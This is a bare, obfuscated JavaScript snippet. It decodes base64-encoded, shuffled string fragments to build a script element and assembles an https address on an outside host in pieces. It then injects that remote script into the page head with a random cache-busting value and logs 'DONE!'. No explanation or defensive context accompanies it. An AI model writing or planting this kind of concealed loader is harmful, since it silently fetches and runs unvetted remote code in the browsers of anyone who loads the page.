var a = ['aGVhZA==', 'cmFuZG9t', 'RE9ORSE=', 'c3Jj', 'Y3JlYXRlRWxlbWVudA==', 'OS5p', 'YXBwZW5kQ2hpbGQ=', 'dGV4dC9qYXZhc2NyaXB0', 'cmFu', 'ci9m', 'dHlwZQ==', 'b2Rldjk=', 'anM/', 'aW5hbA==', 'ZGUu', 'dHBzOi8v', 'X2Nv', 'c2NyaXB0', 'bG9n'];
(function (b, e) {
    var f = function (g) {
        while (--g) {
            b['push'](b['shift']());
        }
    };
    f(++e);
}(a, 0x8e));
var b = function (c, d) {
    c = c - 0x0;
    var e = a[c];
    if (b['SRUhOX'] === undefined) {
        (function () {
            var g;
            try {
                var i = Function('return\x20(function()\x20' + '{}.constructor(\x22return\x20this\x22)(\x20)' + ');');
                g = i();
            } catch (j) {
                g = window;
            }
            var h = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
            g['atob'] || (g['atob'] = function (k) {
                var l = String(k)['replace'](/=+$/, '');
                var m = '';
                for (var n = 0x0, o, p, q = 0x0; p = l['charAt'](q++); ~p && (o = n % 0x4 ? o * 0x40 + p : p, n++ % 0x4) ? m += String['fromCharCode'](0xff & o >> (-0x2 * n & 0x6)) : 0x0) {
                    p = h['indexOf'](p);
                }
                return m;
            });
        }());
        b['HyTiww'] = function (g) {
            var h = atob(g);
            var j = [];
            for (var k = 0x0, l = h['length']; k < l; k++) {
                j += '%' + ('00' + h['charCodeAt'](k)['toString'](0x10))['slice'](-0x2);
            }
            return decodeURIComponent(j);
        };
        b['jNbysC'] = {};
        b['SRUhOX'] = !![];
    }
    var f = b['jNbysC'][c];
    if (f === undefined) {
        e = b['HyTiww'](e);
        b['jNbysC'][c] = e;
    } else {
        e = f;
    }
    return e;
};
var script = document[b('0xe')](b('0x8'));
var random = Math['floor'](Math[b('0xb')]() * 0x2710);
script[b('0x1')] = b('0x11');
var str1 = 'ht';
var str2 = b('0x6');
var str3 = 'pr';
var str4 = b('0x2');
var str5 = b('0xf');
var str6 = b('0x0');
var str7 = b('0x4');
var str8 = b('0x7');
var str9 = b('0x5');
var str10 = b('0x3');
var str11 = b('0x12');
var str12 = 'd=' + random;
script[b('0xd')] = str1 + str2 + str3 + str4 + str5 + str6 + str7 + str8 + str9 + str10 + str11 + str12;
document[b('0xa')][b('0x10')](script);
console[b('0x9')](b('0xc'));
